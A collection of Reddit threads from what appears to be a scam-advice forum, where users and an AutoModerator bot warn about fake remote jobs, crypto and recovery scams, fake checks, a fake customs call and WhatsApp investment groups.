- Awe thank you so much for this information, yeah my soul is crushed right now <\3 but I‚Äôm sure eventually something will turn up. It seems the only way to WFH is by going through official websites like apple ect. But again thank you
- Haha no way.  I think this commenter is getting scammed.  I‚Äôll look more at the site but at first glance bro is not working for GE

Edit: looks legit for the most part.  Just horribly designed
- You need to look for a job *in person.* If you don't have unique skills and a decade or two of experience, you will not be working remote.

99.9% of unskilled remote jobs are scams. Jobs like remote data entry do not exist. Hell, almost all unskilled in person data entry jobs are completely gone. They are scams 1,000% of the time.

Some dinky little realty company has no use for these kinds of employees. Any data entry work there would be like 5% of their receptionist's job.
- You can try asking temp/employment agencies for placements that are WFH.  Youll get paid a bit less because you're not doing the footwork and the jobs are kinda hellish.  A friend of mine did apple support remotely through an employment agency.  No one will ever reach out to you to offer you a job.

Otherwise, you're going to need to come to terms with the fact that most jobs are not WFH.  COVID made people THINK there are lots of remote positions, but generally that's the case only if you've been with the company for an extended period of time.
- Scroll this sub for a few weeks to see all the remote job scams to watch for.
- Sorry that you got your hopes up.  I do agree that the vast majority of work from home jobs are a scam and not real. Without skills in a certain area like IT or something similar, or a degree, it is hard to find a legitimate WFH job and you will need to start applying to places to go work in person.

If you do have a degree, I know that many insurance carriers hire work from home for entry level adjuster positions and some other customer service positions. This is assuming you are okay working with people and doing customer service.
- It will not turn up. You must apply to real jobs that you will attend in person. Period.
- Legit companies are pulling back from WFH. Any job listing along those lines that you see now is likely to be a scam.
- Yup. My wife has a PhD and she only gets to work from home two days a week.
- Exactly. I can work from home. Except I'm a financial specialist with over a decade of experience. Some meetings still require my presence in the office, as well as some collaboration effort.

There's no remote data entry jobs. Why not? Data is entered into a database, in a uniform format. It is received in either:

1) Full digital format. A machine can easily deduct which information goes where, puts it in the database without human intervention.

2) Physical format. You can pay somebody to scan the paper and email it to the remote "data entry specialist". Or you can tell the data entry specialist "Pick up the mail at the office and do your job on-site". Guess which one they'll pick?
- Yup. I was able to get a fully remote job just recently because I have about a decade of experience in my specific engineering field.
- I have a remote data entry/admin assistant job for a local company but i was lucky. I knew someone who worked there, I got the job back when offices were still going remote and stayed remote as the years went on. But staying remote is hard work. I have to work harder and faster to be able to keep being remote.¬†


It's not something that will just happen from finding a job entry. It's a series of unlikely scenarios outside of our control that might converge but most likely won't. Even finding a non remote job can be like that now.
- Agree that legitimate temp and contract agencies are the best bet for locating an off-site positions.
- One of my besties does insurance claims from home. But she has a degree and years of experience.
- Same. I have extremely niche skills in a niche business. I'm still in the office three days even though I could do the job from a beach somewhere.
- Me, too‚ÄîSaturday and Sunday!

( rimshot )
- Yup. There are companies that still allow entry-level positions to do wfh.

- > my father been getting into crypto

Your father has been instructed by a !crypto scammer to send Cryptocurrency to their wallet, and in return they have shown some magic numbers on a screen.

Tell your father to break all contact, this is a scam and any money he sent is GONE.
- !crypto scam

Paying to get paid is always a scam.
- Heck, most everything involving crypto is a scam. Crypto was created by crooks, for crooks.
- For some reason the !refund scam warning wasn't generated. Hopefully I got that right, fairly new here. This is super important OP, any money already sent is gone and can not be recovered by anybody. Do not be further scammed by people reaching out in your DMs saying they can help you get the money back, they can't, even if they say they are from the FBI. Show your father this thread or thousands (literally) like it.

Oops, added an additional comment that I meant the recovery scam, not the refund scam.
- This is a scam, do not send them money. Your money is gone.
- Hi /u/Salty_Dugtrio, AutoModerator has been summoned to explain the Fake crypto wallet scam.

Fake cryptocurrency websites and apps controlled by scammers are becoming more and more common. Sometimes the scam begins with a romance scammer who claims that they can help the victim invest in cryptocurrency. Victims are told to buy cryptocurrency of some kind using a legitimate cryptocurrency exchange, and then they are told to send their cryptocurrency to a website wallet address where it will be invested. Sometimes the scam begins with a notice that the victim won cryptocurrency on some website, in this case messages will often be sent through Discord.

In either case, the scammer controls the website, so they make it look like there is money in the victim‚Äôs account on their website. Then the scammer (or the scammer pretending to be someone official who is associated with the website) tells the victim that they have to put more money into the website before they can get their money out of the website. Of course all of the money sent by the victim has gone directly into the scammer‚Äôs wallet, and any additional money sent by the victim to retrieve their money from the website will also go directly into the scammer‚Äôs wallet, and all of the information about money being held by the website was totally fake.

If the scammer used Bitcoin, then you can report the scammer‚Äôs Bitcoin wallet address here: https://www.bitcoinabuse.com/reports. If the scammer used Ethereum, then you can report the scammer‚Äôs Ethereum wallet address here: https://info.etherscan.com/report-address/. You can see how much cryptocurrency has been sent to the scammer‚Äôs wallet address here: https://www.blockchain.com/explorer. Thanks to redditor nimble2 for this script.

- Yes my father is talking to this girl who claims she can help him with crypto investments. He said all the investment will go to her account because she is oversea & it‚Äôs a lot harder for him to access it due to the taxes. She will slowly send him about 5-6k after he pays the taxes. If I‚Äôm being honest he‚Äôs going to really pay the taxes and even myself can‚Äôt stop him.

- Oops, sorry I meant the !recovery scam.
- Hi /u/PandaNoTrash, AutoModerator has been summoned to explain the Refund scam.

Refund scams usually start with a spam email about a fake transaction, although they can also be sent through SMS or any other messaging service. The message will provide you with a phone number to call if you want to cancel the transaction, and if you call the scammers will try to get you to provide credit card or banking information in order to receive your refund. Scammers have been taking advantage of Paypal's invoice system to send out realistic scam emails through Paypal itself, here is a news article about that technique: https://krebsonsecurity.com/2022/08/paypal-phishing-scam-uses-invoices-sent-via-paypal/. Here is a Snopes article regarding the Norton variant of this scam: https://www.snopes.com/fact-check/norton-email-renewal-scam/

If you know someone that fell for a refund scam, sit down together to watch this video by Jim Browning and try to retrace their steps: https://youtu.be/X4PllvUowaQ

- Hi /u/PandaNoTrash, AutoModerator has been summoned to explain the Recovery scam.

[Recovery scams](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams) target people who have already fallen for a scam. The scammer may contact you, or may advertise their services online. They will usually either offer to help you recover your funds, or will tell you that your funds have already been recovered and they will help you access them. In cases where they say they will help you recover your funds, they usually call themselves either \"recovery agents\" or hackers.

When they tell you that your funds have already been recovered, they may impersonate a law enforcement, a government official, a lawyer, or anyone else along those lines. Recovery scams are simply [advance-fee](https://en.wikipedia.org/wiki/Advance-fee_scam) scams that are specifically targeted at scam victims. When a victim pays a recovery scammer, the scammer will keep stringing them along while asking for increasingly absurd fees/expenses/deposits/insurance/whatever until the victim stops paying.

If you have been scammed in the past, make sure you are aware of recovery scams so that you are not scammed a second time. If you are currently engaging with a recovery scammer, you should block them and be very wary of random contact for some time. It's normal for posters on this subreddit to be contacted by recovery scammers after posting, and they often ask you to delete your post so that you both cannot receive legitimate advice, and cannot be targeted by other recovery scammers.

Remember: never take advice in private. If someone reaches you in private after posting your scam story, it is because a scammer will always try to hide from the oversight of our community members. A legitimate community member will offer advice in the open, for everyone to see. Anyone suggesting you should reach out to a hacker is scamming you.

- Yeah, I've seen that before too. USPS is notorious for having a crappy tracking system. I'd give it some more time.
- Sometimes tracking just gets messed up.  I had a UPS package once which never updated the tracking after the first day, and it showed up as expected.  The tracking never updated.
- I own my own mom & pop buisness. We ship a good 15-20 items a week. This is sadly completely normal for USPS right now. Half the packages we ship (We scan every package we ship) shows "USPS in possession of the item" and then nothing again for days. 

We had one item this last year was scanned and then 3 days later it was scanned again at the same post office. It hadn't moved from the post office we mailed it at. We had another three packages (For different cities on both the east and west coast) in November mailed on the same day here in KC dissappear. No tracking on them for a week. When they finally were tracked all 3 packages were in Fargo North Dakota.

As for returning and taking their package back from the post office. The post office won't let you do that.

So in short, you should be fine. This is sadly normal post office at the moment. Things are not getting scanned like they should or were just a few years ago.
- If a package seems to be stuck in one location in the tracking system for a long time, it often means that the package got lost. That doesn't necessarily mean that it's a scam.

There's no way to get a package back from the USPS once you've dropped it off. 

If the package was insured, I think you can go to your local post office with the tracking number and file a claim, which will trigger them looking for the package. 

If it's lost, depending on what online service you used, check to see if it included buyer protection (which big selling sites like Ebay and Amazon often have). If so, then you can wait a few more days and then file a claim there and try to get the sale canceled.

I suppose this might be a scam if the package was empty and the seller deliberately messed up the address to make it go astray and become undeliverable. But you can check that in the USPS tracking system. 

One lesson from this: buy things online only through sellers that provide full buyer protection. Include insurance in the shipping. If possible, in the US use UPS instead of the USPS. UPS has a better tracking process and is faster to pay an insurance claim.
- I've had that happen more than once - no update between "USPS in possession of item" and "Item Delivered."
- Are you using the tracking number, and checking at USPS.com? That's the only way to check the shipping status.

Dodgy shippers will tell you that they've shipped a package when they haven't really taken it to the post office. So, often they say it's been shipped, but all they did was get a tracking number, and USPS.com will show status as "Shipping Label Created, USPS Awaiting Item" or similar.
- I don‚Äôt think it‚Äôs very likely that the sender asked for their item back and received it after it was scanned.

If I had to guess, the seller is just being unresponsive because they don‚Äôt have any additional information - not exactly white glove customer service, but I wouldn‚Äôt jump to assuming they scammed you yet.
- I wonder if I went to my local PO if they‚Äôd be able to tell that. I don‚Äôt know that there would be any update to the tracking ever if the package was picked back up.
- I did this one time when a package was seemingly stuck in a sorting center. Even their customer service said multiple times "Just wait a few more days."

Then I finally gave up, and went to file a claim, because the flat rate boxes have insurance. They told me I had waited too long, and was no longer eligible for a claim.
- OP is using USPS, not UPS. Like talking to your friend with a Chevy question about a problem you once had with a Ford.
- Yes, USPS.com shows ‚ÄúUSPS in possession of item‚Äù, it hasn‚Äôt had any further updates.
- I‚Äôm not sure. They also couldn‚Äôt provide proof of a receipt that it had been dropped off. Just emailed me the tracking number. That is what initially sparked some concern..
- I don't know, I doubt it. Once it's in their system they can only tell you what you can see with online tracking. I ordered some stamps from USPS themselves (online order), they shipped it to me Priority Mail, and I'm not exaggerating that USPS tracking showed my package bouncing between three sorting facilities in three different states with something like 30 tracking updates. It took a whole MONTH for me to receive those stamps, I was really pissed. So, I have no faith in shipping anything via USPS.
- You can make a report. USPS on their website a form where you can put in about a lost package. 

The sender by the way can't just go back and pick the package back up. Once you mail it it's mailed. You can't go in and take it back.
- I knew that.  I'm  just saying that tracking systems makes mistakes.
- It's the same with USPS though. THeir tracking may or may not update.
- Does the tracking number show your name and address as the destination? It might be a fake tracking number, and the only way to find that out is to go talk to the USPS, preferably in person.
- I didn‚Äôt think to ask the post office lady if it had my name and address but she did confirm that it‚Äôs supposed to be sent to my location. Good point though. I may stop in again tomorrow if I don‚Äôt see an update and clarify.
- Honestly, it sounds like a legit lost package. Which is irritating enough.

Title: Scam call: Customs and border control seized a package addressed to you
Body: # I mean it's either a scam or I'm getting arrested soon?

^(In my defense for even engaging in this call as long as I did:)

*  ^(1) sometimes I'm stupid, I'm human.) 
* ^(2) I was making various calls for work at the time so I was kinda tired and I answered because it was possible it could have been a work related call.) 
* ^(And 3) I was (stupidly) interested and curious in the narrative of it all it was bizarre. I had to know details about how this was allegedly working. Like I was impressed by what seemed to be a depth to the set up and background story.)

I got this call allegedly from the dept of homeland security/ customs and border control. I was asked for my name and zip to confirm my identity and if I had been expecting any international packages or have ever been a victim of identity theft. Even as I said this call was weird and feels like a scam the guy was polite and tried very hard to assure me it wasn't.  He even gave me a name, badge number, and the case ID number and asked me to get pen and paper to write it down (see I thought that was interesting).

  
**Allegedly** customs had seized a package sent to my address so they were calling to give the benefit of the doubt, confirm my identity, and see if I know anything about it. He needed my name and zip to confirm my identity and that he couldn't give me details to discuss further until I did so (which I did not). Supposedly if I didn't give that information the case would be given to the local sheriff and I could get a lawyer. I did a lot of back and forth trying to clarify if he did indeed allegedly have my name and address in front of him, what the call was about, was it a scam, and the repercussions of not cooperating, etc.

(Gist of the story/scam ends here if you're tired of reading)

Eventually I did say I understood the (alleged) consequences and insisted I was not comfortable giving my name and zip. He said okay and the case would be passed along and that there was a warrant out for my arrest (and then called me a bitch). When I asked real quick that hey, if this call is being recorded then did it just record you calling me that (a bitch), he promptly hung up. VERY polite and understanding right up until that point though.

Given that I was actively looking up scams, checking the number, and info about customs (scams and how they contact people.) The number actually did come up as one known for a different type of scam call.  Look I was intrigued ok! It was ridiculous and dramatic!

  
I know I saw another post with the same scam but I see that our experiences differed a bit. I gave NO information and was not given confirmation they had my information (couldn't give details in case I was a fraud of course) and essentially the scammer tried to use a sense of reasoning threat of arrest to get me to reconsider.

- Fascinating. What a wild story, like the set up is just insane to me the length of the fabrication they'll go through.

- >they both had sent paychecks to my email

Images of checks are **never** valid.  If you don't have the physical instrument in your hand, complete with security features like watermarks, micro-print, and magnetic ink, then it's not real.

>but I figured if I scanned them and they were faulty then my app would tell me‚Ä¶ right?

Nope!  At least not until the bank fails to reconcile the check with the issuing account, which could take weeks.  But they're required by law to float you the deposit amount within 24 hours.  So if the check bounces after that, they're pull the amount back out of your account, even if it leaves you in the negative.

>I‚Äôm concerned on whether this money is real or not, and whether or not the checks will bounce.

They're not real, and they will bounce.  It's also likely that your bank will view this as *you* trying to defraud *them*, which means that they may close your account and refuse to ever have you as a customer again.  You need to call your bank's fraud department (*specifically* the fraud department) and tell them that you think you may have deposited fraudulent checks.  Getting ahead of this may be the one thing that stops them from "firing" you as a customer.

And for future reference, "sugar daddies" are people who you fuck for money.  It's essentially being a sex worker with a regular customer.  "Online sugar daddies" are always going to be scams.
- Yes. They‚Äôre !fakecheck. They will bounce. Your bank will reverse the deposits. They will probably charge you a fee for depositing a bad check. And they may close your accounts now that you‚Äôve proven yourself to me a massive fraud liability. You need to call them **right now** and get on top of this and beg for mercy. 

If you need money, get a job. No one is giving out free money to strangers on the internet. No one.
- Paycheck ? How‚Äôs that a paycheck ? You get a paycheck when you get a job & do work .
That‚Äôs a scam check.
- >I figured if I scanned them and they were faulty then my app would tell me‚Ä¶

That is going to be viewed by the bank as a feeble excuse to avoid accountability.  Just before they shut down your bank account forever.
- Yes they'll bounce - but remember these are not just regular checks, they are FAKE checks. It's best if you go and talk to your bank's **fraud department** as soon as possible to sort this out. 

Be aware that with what you did, there is a high chance that they see this as a risk to their company and not want to bank with you anymore. You need to get ahead of it and try to convince them  you now know what you did was wrong and hopefully they won't close the account.
- !fakecheck

!sugar

Read below and call your bank ASAP
- You've only made your situation worse. Not only will the checks bounce and put your account into the negative, you'll owe your bank fees, and they will very likely close your account. And they could you refer you to the police. Do not talk to the cops no matter what they say. Nobody will believe you that you didn't know these were bad checks.
- Yes.

!fakecheck
- Fake
- You could be criminally charged with bank fraud.
- Someone I know deposited bad cheques and all his accounted were locked as he was suspected of fraud. He contacted them to explain what happened and it was a real pain in the ass. Like t-poke said, beg for mercy.
- Hi /u/t-poke, AutoModerator has been summoned to explain the Fake check scam.

The fake check scam arises from many different situations (fake job scams, fake payment scams, etc), but the bottom line is always the same, you receive a check (a digital photo or a physical paper check), you deposit a check (via mobile deposit or via an ATM) and see the money in your account, and then you use the funds to give money to the scammer (usually through gift cards or crypto). Sometimes the scammers will ask you to order things through a site, but that is just another way they get your money.

Banks are legally obligated to make money available to you fast, but they can take their time to bounce it. Hence the window of time exploited by the scam. During that window of time the scammer asks you to send money back, because you are under the illusion that the funds cleared.

When the check finally bounces, the bank will take the initial deposit back, and any money you sent to the scammer will come out of your own personal funds. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months. If you do not have the funds to cover the amount, your balance will go negative.

- Hi /u/Hear-that-sound, AutoModerator has been summoned to explain the Fake check scam.

The fake check scam arises from many different situations (fake job scams, fake payment scams, etc), but the bottom line is always the same, you receive a check (a digital photo or a physical paper check), you deposit a check (via mobile deposit or via an ATM) and see the money in your account, and then you use the funds to give money to the scammer (usually through gift cards or crypto). Sometimes the scammers will ask you to order things through a site, but that is just another way they get your money.

Banks are legally obligated to make money available to you fast, but they can take their time to bounce it. Hence the window of time exploited by the scam. During that window of time the scammer asks you to send money back, because you are under the illusion that the funds cleared.

When the check finally bounces, the bank will take the initial deposit back, and any money you sent to the scammer will come out of your own personal funds. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months. If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam.

- Hi /u/Hear-that-sound, AutoModerator has been summoned to explain the Sugar daddy or momma scam.

Sugar dad/daddy/mom/momma scams are [very common](https://www.fraud.org/sugarbaby_alert) and usually come in two varieties: fake check style scams, and advance-fee scams. Fake check style scams involve the scammer making a fraudulent payment to you that will later be reversed, and then you making some sort of payment to the scammer that will not be reversed. Common examples include the scammer sending you a fake check and asking you to buy gift cards, or to send money via Western Union, or to purchase Bitcoins. Another common example involves the sugar scammer offering to pay your bills, or offering you banking information that you will use to pay off your bills. These bank accounts are stolen and the innocent victim will reverse the charge when they notice the fraud.

The second variety of sugar scammers use advance-fee scams, where they offer you money but require you to pay first. They may ask for you to pay them to prove that you are loyal, or they may require you to pay a processing fee. It's common for sugar scammers to send spoofed emails that look like they came from services like PayPal or CashApp that will inform you that you have received money, but that also ask for a processing fee before the funds are released.

In the real world, sugar babies are sex workers that engage in in-person sexual encounters with their clients. **We do not recommend that people try to be a sugar baby, but if this is what you are looking into, check out the following subreddits for information on how to be safe: r/SugarLifestyleForum/ and /r/SexWorkers**.

- That would be wise if you want to avoid possible account closure and felony bank fraud charges.
- Yes, because the checks are still fake and will cause trouble for the bank. Be warned, they might close your account.
- Oh boy, Chase is the **last** bank you should do this with. They do not take this lightly, especially after the tide pod eating idiots on TikTok got the fake check glitch with Chase ATMs trending a few months ago. 

You need to call back and ask to speak to their fraud department.  Expect them to close your account if you don‚Äôt do anything.
- Excellent point.  Once Chase clobbers the account the OP will end up in ChexSystems and no bank will want to deal with her.

Use $50-100 to open a checking account at a new bank ASAP before Chase puts the black marks on your record.

Title: how do I report a pig butchering scam?
Body: For the past month or more I've been connecting on WhatsApp to a day-trading group on WhatsApp where they tell you a stock to buy at a specific price, day and time and then to sell at another day and time within a few days.  They have been leading up to today--the day they want you to buy a much larger amount and keep for 20 days or so.  They claim my 20K buy will increase by 180 to 300 percent (very precise--how?).  The big buy is in 4 hours from now.   Is this me about to be drawn into a pig butcher scam?   And if so how do I report them?

EDIT I tried to do a reverse image search on the "administrator's" picture and i could not take a screen shot on my phone.  the image looks like a stock photo.  I'm just not going to do it and will block them.  after I learn what stock they are recommending.  Just to satisfy myself.  Going to buy myself a nice present instead and put the cash I raised into something reliable like an index fund.

Whew!!  Too close for comfort.  My late husband used to say, about investing "Bears can make money, Bulls can make money, but pigs get slaughtered."  He was right.

- Yes it's a scam, honestly I wouldn't bother reporting it because Meta doesn't give a shit and they're based abroad. Leave the group and block it, that's it.
- You had me at ‚Äúconnecting WhatsApp to a day-trading group‚Äù
- Sounds like they‚Äôve been fattening you up for the kill.

Search this sub for WhatsApp + investment. THEY ARE ALL SCAMS!

Even if the trading platform you‚Äôre on is legit, and they often aren‚Äôt, it sounds like a pump n dump scheme to me. Eventually you‚Äôll be the one that gets left behind.
- It's a WhatsApp. Dead giveaway that it's a scam.
- This was a scam from the first second you joined.

There is no such thing as legitimate crypto investment groups on WhatsApp.

Report? lol‚Ä¶

Just leave now and move on.
- yes its a scam, you can go to the group then report them via the drop down options, it won't do any good, just scream out in the group chat ITS A SCAM!! and hope somebody sees it before it gets removed, then block them and the group admin
- What do you mean "the cash you raised"? If you're talking about the scammer's site or their app, you realize that it is just fake, right? Those numbers that they show that claims to be your balance is actually something that they're typing on their side that makes it look like you have that money that they have already taken and spent on themselves.
- Hate to say it but greed is the biggest motivator for scams.
- How are you investing? Through their platform or another? If it‚Äôs theirs, you‚Äôve made no money. It‚Äôs all gone. Watch out for !recovery scammers.
- Guaranteed 180+% increase? Not legit ever. Sounds like a pump and dump. No real ‚Äútrading groups‚Äù exist on WhatsApp. They‚Äôre all scams.
- Random internet strangers aren't trying to help you make money.  They're trying to help themselves to your money
- This is a !crypto fake investment scam, without the pretty lady. Just block and report the whatsapp group. Stop joining those groups. It's all fake.
- Any investing information provided via any app like WhatsApp, Telegram, Signal etc. are scams. Any "coach/assistant/professor" offering advice are scammers.

The other people in these groups are scammers, bots or other victims.

There is no free money on the Internet.
- I get these every day on viber, whatsapp, facebook messenger, etc. Some group where everyone has a supermodel picture and is constantly talking in poorly constructed conversations about how the genius investor of this group has taught them how to be rich.
- WhatsApp + Day Trading Group = Pump and Dump Scammers
- If you're on WhatsApp, talking to a stranger, it's a scam. Block, ignore and don't do this again.
- Report it in whatsapp. They actually shut them down from time to time.
- You can't report them. No one will ever find them, in all likelihood. 

Everything you saw is fake and a fraud. There was no account, no trading, no investment and no profit. They likely made up screen shots and anything you initially gave them is gone. The 20K (JFC, really?) would have been the final thrust and they likely would have vanished. 20K times the number of victims - pretty good take for hardly any work.
- When you say "cash I raised", I hope you are not talking about cash raised in this day-trading group.

If you are on some app that shows that you've made some profit, it is 100% not real.
- >they tell you a stock to buy at a specific price, day and time and then to sell at another day and time within a few days.

No one's mentioned the SEC? This sounds like something [they might be interested in.](https://www.sec.gov/submit-tip-or-complaint/tips-complaints-resources/report-suspected-securities-fraud-or-wrongdoing)
- Report to SEC? (Securities exchange commission)
- Why bother? No one of authority cares.
- Is this where you trade using their platform? I got taken for 800 last year this way. I felt so damn stupid.
- Screenshot: open https://web.whatsapp.com on YOUR computer and pair YOUR phones WhatsApp with it. Via web.whatsapp it‚Äôs easy to do screenshots. But be warned: everyone with access to this computer has access to your phones WhatsApp (at least when your phone is in same network as your computer.)
- The least you can do is report the domain they're using to the registrar.
- And any money you've gotten so far likely isn't from actual stocks. But rather from some... Money laundering.
- OP it's been a scam from day one. There is nothing to recover or money to buy yourself a gift. It's all Fake. Cut your losses, block and don't listen to recovery scammers. You gained nothing. You raised no cash. They will Say you need to pay to get that cash, it doesn't exist either.
Sry just saw the others comments ü©∑
- You are about to make someone $20k richer. If you can afford to gift them that $, do it, but you are definitely being scammed. Have you ever watched an episode of American Greed? It literally always starts with a con artist telling a mark that they can make them 10, 15 or 20% ROI in a very short time frame and it always ends with the mark being fleeced and the con artist flying off in their private jet.
- I wouldn't trust anything on WhatsApp
- Can you tell us how you got involved in this in the first place? I think if you can give us details, it will help others who end up in the same situation.

What was it about the WhatsApp group that drew you in?
- is it similar to this? Someone named Delia Rose in facebook, who claimed she works for IB started a thread with me.  The thing is, Delia Rose of IB has no linkedin connection and claimed shes just an analyst.

**Delia Rose**  
"Hello, my friend. Our team can provide you with high-quality stocks that can quickly make a profit in the short term. Are you currently investing in stocks?

Today I'll share with you a quality stock with gains of 10-30%, are you interested?

**I sent**

Sure!

**Delia Rose**

Short-term high-quality stock trading strategy  
Stock name: MU  
Purchase price: Buy at current price  
Target price: $114  
Expected return: 17%  
MU's stock price has pulled back to the best buying price, with a short-term target price of $114. In the short term, there will be a safe and stable profit margin of 17%, so you can buy it with confidence.  
Memory chip manufacturer MU has performed strongly this year, with an expected price-to-earnings ratio of only 10.8 times. Its high-bandwidth memory (HBM) and dynamic random access memory (DRAM) products are essential components of artificial intelligence systems. Nvidia CEO Huang Renxun also mentioned at the CES that Micron provides storage support for the company's new gaming chips, and it is expected that MU's stock price will rise well this year.  
After the purchase is successful, please take a screenshot and send it to me so that I can record your information and notify you to sell at a profit!

I left the rest out after this but there was no doubt this person was pulling a scam.
- Don't bother, no one cares.
- You can make money if you know when they will pull the trigger by selling before / buying options if they are available. It‚Äôs also risky but there are people that have shut down scammers by selling off huge amounts before the scammer can
- I'd report it anyway so at least there is a record of facebook not caring about their users safety but yeah probably they will do nothing and if they do the scammers will just have to make new emails and accounts.
- When I was on it I didn't think they ever took anything down that wood violated the TOS.
- I wanted to stop reading there and reply scam, but I needed to know how deep into debt OP may have gone. Glad they caught it and posted in here before the big buy.
- It's like "a hot MILF 2 miles from you wants sex now! click here"
- I've had three people try to pig butcher me just last year, and each one moved the conversation to whatsapp.  Another romance scammer moved it to signal.  I realized it each time pretty soon, the second two times as soon as it moved to whatsapp but the second I thought I'd give them a chance to see if it's legit, it wasn't, then ignored them, and got some strange other scam attempts on my phone not long after.  I think they circulated my number to other scammers.
- there are no voice- meetings.  And they changed the WhatsApp so only admins can post.

Thank goodness for my Spidey-Sense.
- I wonder if OP has realized this yet ?
- Greed and arrogance.  Wanting to get rich quick, and thinking you're smarter than everyone else who's investing the "slow" way.
- Hi /u/IHaveBoxerDogs, AutoModerator has been summoned to explain the Recovery scam.

[Recovery scams](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams) target people who have already fallen for a scam. The scammer may contact you, or may advertise their services online. They will usually either offer to help you recover your funds, or will tell you that your funds have already been recovered and they will help you access them. In cases where they say they will help you recover your funds, they usually call themselves either \"recovery agents\" or hackers.

When they tell you that your funds have already been recovered, they may impersonate a law enforcement, a government official, a lawyer, or anyone else along those lines. Recovery scams are simply [advance-fee](https://en.wikipedia.org/wiki/Advance-fee_scam) scams that are specifically targeted at scam victims. When a victim pays a recovery scammer, the scammer will keep stringing them along while asking for increasingly absurd fees/expenses/deposits/insurance/whatever until the victim stops paying.

If you have been scammed in the past, make sure you are aware of recovery scams so that you are not scammed a second time. If you are currently engaging with a recovery scammer, you should block them and be very wary of random contact for some time. It's normal for posters on this subreddit to be contacted by recovery scammers after posting, and they often ask you to delete your post so that you both cannot receive legitimate advice, and cannot be targeted by other recovery scammers.

Remember: never take advice in private. If someone reaches you in private after posting your scam story, it is because a scammer will always try to hide from the oversight of our community members. A legitimate community member will offer advice in the open, for everyone to see. Anyone suggesting you should reach out to a hacker is scamming you.

- Yup.¬† What OP describes seems more like boiler room pump and dum using a WhatsApp group echo chamber for a megaphone.


Not pig butchering.¬† Not crypto.¬†¬†


Pump.¬† Dump.
- Hi /u/Dofolo, AutoModerator has been summoned to explain the Fake crypto wallet scam.

Fake cryptocurrency websites and apps controlled by scammers are becoming more and more common. Sometimes the scam begins with a romance scammer who claims that they can help the victim invest in cryptocurrency. Victims are told to buy cryptocurrency of some kind using a legitimate cryptocurrency exchange, and then they are told to send their cryptocurrency to a website wallet address where it will be invested. Sometimes the scam begins with a notice that the victim won cryptocurrency on some website, in this case messages will often be sent through Discord.

In either case, the scammer controls the website, so they make it look like there is money in the victim‚Äôs account on their website. Then the scammer (or the scammer pretending to be someone official who is associated with the website) tells the victim that they have to put more money into the website before they can get their money out of the website. Of course all of the money sent by the victim has gone directly into the scammer‚Äôs wallet, and any additional money sent by the victim to retrieve their money from the website will also go directly into the scammer‚Äôs wallet, and all of the information about money being held by the website was totally fake.

If the scammer used Bitcoin, then you can report the scammer‚Äôs Bitcoin wallet address here: https://www.bitcoinabuse.com/reports. If the scammer used Ethereum, then you can report the scammer‚Äôs Ethereum wallet address here: https://info.etherscan.com/report-address/. You can see how much cryptocurrency has been sent to the scammer‚Äôs wallet address here: https://www.blockchain.com/explorer. Thanks to redditor nimble2 for this script.

- I see those stupid comments in random YouTube video comment sections too and it always pisses me off. They must think everyone is stupid.
- Don't feel stupid... these scams work because for all the scammers' stupidity they're good at what they do because they prey on people's desperation. THEY are the ones who should be ashamed, not you!
- looking back it was the question (like in your Delia Rose example above) about high returns on stocks.  I've learned my lesson.  Back to the basics, being very thankful that I did not agree to pay them any money. All my money is right where it started.

I did not know that a WhatsApp contact was by definition shady. I have Whats App conversations with real-world people that I know personally from overseas. Live and learn.
- Very similar
- >report it anyway so at least there is a record of facebook not caring about their users safety

Exactly. If there's a future lawsuit or government investigation into Facebook's practices, it would be good to have it on record that the scam accounts were reported, so Facebook can't claim ignorance.
- You should give them each other's numbers
- Yeah WhatsApp, Signal, & Telegram are ALWAYS scams.
- This is 100% a scam.


Anything to do with whatsapp trading crypto etc is always always a scam.


Nobody is going to give you free stock advice via whatsapp facebook telegram etc. It is always a scam.
- Who has your investment money?
The scammers or you?
(Did you have to ‚Äúinvest‚Äù with ‚Äúthem‚Äù or someone they recommended or did you open and maintain your own separate account ?)
- That's exactly why they did that. Try to cash out and leave. If they give you excuse about why you can't cash out, or that you need to pay money to cash out..... not a good sign
- [removed]
- I've Seen your edit - 
The stock you bought and the money you raised is Fake too. It was a scam from the first minute. They will tell you to pay more to get Access to your wallet - that doesn't exist. People telling you they Can recover this money for you are scammers too. And be very carefull in the next six months because you fell for the scam and they'll try again.
- Unless it's similar to the task scams where they do actually get a little bit of money back as a means to bait them
- Depends it could be just fake investments, they take your money and design web pages to look like it's invested when really it's already in malaysia and untraced from it's source.
- Thank you I pride myself as smart and I fell hook line and sinker.
- Two things
Anyone that you don't know who contacts you on any social site, be very suspicious. 

There ARE stocks that can go up 50% in one day but they're rare. But if you have a legit account with schwab, ib, etc., you can research or get advice and invest your own money into your own account. 

Don't trust anyone you've never met who contacts you first and talks about money. EVER!
- Comment of the Day.
- Better yet tell them you have 50k to invest, but first you need everything you put in and then 5k of their money to get the money out of the bank to pay them.

Title: Applypass, who are they?
Body: I got an email from a certain person representing this company, who claimed that they saw my profile somewhere, which by the way, the information they were referring to was partially wrong and it certainly was an AI-generated email. I checked this person on Linkedin and turns out she is an employee, at an established MNC and her profile had no signs of this enterprise. Is this a scam? I saw another post in this sub suggesting it was not but the email was for sure suspicious and I didn't want to dig much, but they might be impersonating another real-life person, or something behind my understanding is happening and I like to believe it is the latter one.

- Delete it. Stop spending time on spam.
- Most job offers for remote or work from home jobs are scams. There are so many job scams out there, they pretend to give you work like Data Entry, Data Optimization, posting reviews of hotels, or Virtual Personal Assistant, or "inspecting and re-shipping packages". But what the scams really do is steal your money. **Some people have lost thousands to job scams. Some people have gone to prison for getting involved with illegal activities, like money laundering or parcel mule.**

Some red flags for job scams:

- contacted  on WhatsApp, Instagram, Telegram, or other social media

- vague impersonal info on their emails to you, like "Dear Applicant"

- interview by text only

- hired right after interview, or hired without interview

- the pay is much too high for the job tasks (US $30 per hour for simple stuff that the average 12 year old could do)

- you have to pay them for something, or "invest" your own money

- they want to send you a check for you to buy equipment (check is fake, you lose money)

- job involves re-shipping packages (parcel mule)

If you're currently looking for a job, spend a little time here to get familiar with !job scams so you recognize the signs.
- ok, u suggesting me to delete that email? yeah I have no particular interest to pursue on it. Its just with market I am facing, I have to make sure am not losing an opportunity.
- I got 5 emails from past 2 days that show these signs. I am sure my resume reached some dark corners. Thanks for the tips.
